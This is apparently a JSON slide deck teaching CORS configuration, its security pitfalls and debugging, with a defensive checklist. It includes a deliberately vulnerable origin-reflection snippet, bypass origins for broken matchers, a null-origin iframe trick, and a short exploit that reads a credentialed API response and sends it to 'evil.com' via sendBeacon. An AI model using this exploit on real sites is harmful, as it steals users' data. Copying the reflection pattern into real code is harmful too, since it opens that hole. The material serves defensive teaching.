  "date": "07/09/2026",
  "slides": [
    {
      "page_title": "Server Configuration Patterns",
      "blocks": [
        {
          "type": "heading",
          "text": "Layer Duplication"
        },
        {
          "type": "bullets",
          "items": [
            "App adds ACAO, load balancer adds ACAO too",
            "Two ACAO headers = invalid, browser fails the request",
            "Fix by owning CORS in exactly one layer",
            "Gateways: configure at gateway AND integration response"
          ]
        },
        {
          "type": "sidebox",
          "title": "AWS Note",
          "items": [
            "API Gateway needs CORS set on the resource",
            "CloudFront must forward `Origin`",
            "Error responses bypass the integration",
            "Set gateway responses explicitly"
          ]
        },
        {
          "type": "heading",
          "text": "Ordering Rule Of Thumb"
        },
        {
          "type": "diagram",
          "kind": "flow",
          "spec": {
            "nodes": [
              "CORS filter",
              "auth",
              "rate limit",
              "routing",
              "handler"
            ]
          }
        },
        {
          "type": "bullets",
          "items": [
            "CORS first so OPTIONS never reaches auth",
            "Set CORS headers on 401/403/500 too",
            "Otherwise a CORS error masks the real failure"
          ]
        },
        {
          "type": "code",
          "lang": "bash",
          "lines": [
            "curl -i -X OPTIONS https://api.com/x \\",
            "  -H 'Origin: https://app.com' \\",
            "  -H 'Access-Control-Request-Method: PUT' \\",
            "  -H 'Access-Control-Request-Headers: content-type'"
          ],
          "runnable": false
        },
        {
          "type": "heading",
          "text": "The Classic Bug",
          "ink": "red"
        },
        {
          "type": "code",
          "lang": "js",
          "lines": [
            "// NEVER do this",
            "res.set('Access-Control-Allow-Origin', req.headers.origin)",
            "res.set('Access-Control-Allow-Credentials', 'true')",
            "// any site can now read authenticated responses"
          ],
          "runnable": false
        },
        {
          "type": "bullets",
          "items": [
            "Blind reflection + credentials = full read of user data",
            "Wildcard with credentials is browser-blocked",
            "So attackers hunt for reflection instead",
            "Reflection is the actual exploit vector"
          ]
        },
        {
          "type": "heading",
          "text": "Broken Matchers"
        },
        {
          "type": "table",
          "headers": [
            "Check",
            "Attacker origin"
          ],
          "rows": [
            [
              "`startsWith('https://app.com')`",
              "`https://app.com.evil.com`"
            ],
            [
              "`endsWith('app.com')`",
              "`https://evilapp.com`"
            ],
            [
              "`/^https:\\/\\/app.com$/`",
              "`https://appXcom`"
            ],
            [
              "exact string set",
              "none"
            ]
          ]
        },
        {
          "type": "callout",
          "style": "tip",
          "title": "The Unescaped Dot",
          "text": "In a regex `.` matches any character. `app.com` silently accepts `appXcom`. Escape it, or better, stop using regex for origins."
        }
      ]
    },
    {
      "page_title": "Misconfigurations That Become Vulnerabilities",
      "blocks": [
        {
          "type": "heading",
          "text": "Over-Trusted Origins"
        },
        {
          "type": "bullets",
          "items": [
            "`*.app.com`: one XSS or one dangling subdomain owns the API",
            "Subdomain takeover turns into full API read",
            "Trusting `http://`: a network attacker injects and pivots",
            "Trusting `localhost` in prod: hostile local app reaches you"
          ]
        },
        {
          "type": "heading",
          "text": "The `null` Trap"
        },
        {
          "type": "code",
          "lang": "html",
          "lines": [
            "<iframe sandbox=\"allow-scripts\"",
            "  src=\"data:text/html,<script>...</script>\">",
            "<!-- this frame's Origin is null, for free -->"
          ],
          "runnable": false
        },
        {
          "type": "bullets",
          "items": [
            "`ACAO: null` + credentials is trivially exploitable",
            "Attacker gets `null` from any sandboxed iframe",
            "Never allowlist the literal string `null`"
          ]
        },
        {
          "type": "heading",
          "text": "Exploit Shape"
        },
        {
          "type": "diagram",
          "kind": "flow",
          "spec": {
            "nodes": [
              "victim visits evil.com",
              "fetch with credentials",
              "reads response",
              "exfiltrates",
              "chains token"
            ]
          }
        },
        {
          "type": "code",
          "lang": "js",
          "lines": [
            "const r = await fetch('https://api.bank.com/me',",
            "  {credentials:'include'})",
            "navigator.sendBeacon('//evil.com', await r.text())"
          ],
          "runnable": false
        },
        {
          "type": "sidebox",
          "title": "Impact Ladder",
          "items": [
            "Read PII from the response",
            "Steal API keys and CSRF tokens",
            "Chain the token into a write",
            "Escalate to full account takeover"
          ]
        },
        {
          "type": "callout",
          "style": "takeaway",
          "title": "Internal APIs Are Worst",
          "text": "A permissive internal service plus a victim on the VPN gives an SSRF-like read primitive driven from the browser."
        },
        {
          "type": "heading",
          "text": "Defenses"
        },
        {
          "type": "bullets",
          "items": [
            "Exact-string allowlist. No regex, no prefix, no suffix",
            "Never reflect an unknown origin",
            "Credentials only where genuinely required",
            "Never source the allowlist from user-controllable data"
          ]
        },
        {
          "type": "heading",
          "text": "Safe Allowlist Shape"
        },
        {
          "type": "code",
          "lang": "js",
          "lines": [
            "const OK = new Set(['https://app.com'])",
            "if (OK.has(req.headers.origin)) {",
            "  res.set('Access-Control-Allow-Origin', origin)",
            "  res.set('Vary', 'Origin')",
            "}",
            "// no match: omit ACAO entirely"
          ],
          "runnable": false
        }
      ]
    },
    {
      "page_title": "Misconfigurations That Become Vulnerabilities (cont.)",
      "blocks": [
        {
          "type": "bullets",
          "items": [
            "Omitting ACAO is the correct rejection",
            "Never answer with `ACAO: null`",
            "Never return 403 that still carries CORS headers",
            "Tenant-registered domains are user-controllable data"
          ]
        },
        {
          "type": "table",
          "headers": [
            "Pattern",
            "Verdict"
          ],
          "rows": [
            [
              "public read-only `*`",
              "safest",
              ""
            ],
            [
              "exact allowlist + `Vary`",
              "good"
            ],
            [
              "reflect any origin",
              "critical"
            ],
            [
              "regex on origin",
              "fragile"
            ]
          ]
        },
        {
          "type": "code",
          "lang": "bash",
          "lines": [
            "curl -sI https://api.com/me \\",
            "  -H 'Origin: https://evil.com' | grep -i allow-origin",
            "# expect: nothing at all"
          ],
          "runnable": false
        },
        {
          "type": "callout",
          "style": "tip",
          "title": "Audit Cadence",
          "text": "Run the `Origin: https://evil.com` probe on every deploy. A reflection bug reintroduced by a config change is invisible from inside the app."
        },
        {
          "type": "heading",
          "text": "Step One: Read The Error",
          "ink": "blue"
        },
        {
          "type": "paragraph",
          "text": "The browser names the exact missing header. Each message maps to exactly one fix — do not guess before reading it."
        },
        {
          "type": "table",
          "headers": [
            "Console message",
            "Fix"
          ],
          "rows": [
            [
              "No ACAO header is present",
              "never emitted, or only on 200"
            ],
            [
              "value X not equal to origin",
              "allowlist miss, scheme/port"
            ],
            [
              "field x-api-key not allowed",
              "add to `Allow-Headers`"
            ],
            [
              "doesn't pass access control",
              "check OPTIONS status"
            ],
            [
              "Redirect is not allowed",
              "kill the preflight hop"
            ]
          ]
        },
        {
          "type": "bullets",
          "items": [
            "'not allowed by Allow-Headers': one name missing, all fails",
            "Preflight failures are usually 401/404/405 on OPTIONS",
            "Redirect case: fix trailing slash or `http`→`https`",
            "Point the client at the final URL directly"
          ]
        },
        {
          "type": "heading",
          "text": "Steps Two To Four"
        },
        {
          "type": "diagram",
          "kind": "flow",
          "spec": {
            "nodes": [
              "read console",
              "curl with Origin",
              "check duplicate ACAO",
              "bust caches"
            ]
          }
        },
        {
          "type": "bullets",
          "items": [
            "Reproduce with `curl -H 'Origin: ...'` explicitly",
            "curl fine but browser fails: suspect preflight or cache",
            "Check for duplicate ACAO from proxy plus app",
            "Bust CDN and preflight cache before calling the fix broken"
          ]
        }
      ],
      "cont": true
    },
    {
      "page_title": "Debugging Playbook & Recap",
      "blocks": [
        {
          "type": "heading",
          "text": "Reproduce Without A Browser"
        },
        {
          "type": "code",
          "lang": "bash",
          "lines": [
            "curl -sI https://api.com/x \\",
            "  -H 'Origin: https://app.com'",
            "# want: access-control-allow-origin"
          ],
          "runnable": false
        },
        {
          "type": "bullets",
          "items": [
            "curl ignores SOP — the headers are the whole signal",
            "No ACAO in curl output: the fix is server-side",
            "Two ACAO lines: proxy and app both wrote one",
            "Also check the header on a 401 and a 500"
          ]
        },
        {
          "type": "heading",
          "text": "Preflight Cache Caps"
        },
        {
          "type": "table",
          "headers": [
            "Browser",
            "Max-Age cap"
          ],
          "rows": [
            [
              "Chromium",
              "7200s"
            ],
            [
              "Firefox",
              "86400s"
            ],
            [
              "Safari",
              "~600s"
            ],
            [
              "debugging",
              "set `0`"
            ]
          ]
        },
        {
          "type": "callout",
          "style": "tip",
          "title": "Cache Can Mask A Fix",
          "text": "Cache key is origin, URL, method, header set. A cached preflight hides a CORS regression for hours after deploy — set `Max-Age: 0` while debugging."
        },
        {
          "type": "heading",
          "text": "Simple vs Preflighted"
        },
        {
          "type": "diagram",
          "kind": "cards",
          "spec": {
            "cards": [
              {
                "title": "Simple",
                "lines": [
                  "no OPTIONS",
                  "GET/HEAD/POST",
                  "3 content-types",
                  "one round trip"
                ]
              },
              {
                "title": "Preflighted",
                "lines": [
                  "OPTIONS first",
                  "any method",
                  "any header",
                  "extra round trip"
                ]
              }
            ]
          }
        }
      ]
    },
    {
      "page_title": "Debugging Playbook & Recap (cont.)",
      "blocks": [
        {
          "type": "heading",
          "text": "`*` vs Echoed Origin"
        },
        {
          "type": "table",
          "headers": [
            "",
            "`*`",
            "echo"
          ],
          "rows": [
            [
              "cookies",
              "no",
              "yes"
            ],
            [
              "allowlist",
              "none",
              "required"
            ],
            [
              "`Vary: Origin`",
              "not needed",
              "mandatory"
            ],
            [
              "cache",
              "friendly",
              "per-origin"
            ],
            [
              "credentials",
              "blocked",
              "allowed"
            ],
            [
              "setup",
              "one line",
              "allowlist"
            ]
          ]
        },
        {
          "type": "callout",
          "style": "tip",
          "title": "Trade-Off Recap",
          "text": "Fewer preflights means simpler content types and fewer custom headers. Higher `Max-Age` means slower propagation of config changes."
        },
        {
          "type": "heading",
          "text": "Ship Checklist"
        },
        {
          "type": "bullets",
          "items": [
            "Exact-match allowlist, `Vary: Origin`",
            "CORS headers on error responses",
            "OPTIONS handled before auth",
            "Credentials only when needed; no reflection, no regex",
            "Preflight also returns `Allow-Credentials: true`",
            "Every redirect hop must pass CORS on its own",
            "WebSockets: validate `Origin` in the handshake yourself"
          ]
        },
        {
          "type": "callout",
          "style": "takeaway",
          "title": "Security Recap",
          "text": "CORS grants read access, never authorization. Every endpoint still needs its own server-side authz check, independently."
        },
        {
          "type": "callout",
          "style": "cloud",
          "title": "The One-Liner",
          "text": "CORS is the server telling the browser who may read the answer — it never decides who may ask the question."
        }
      ],
      "cont": true
    }
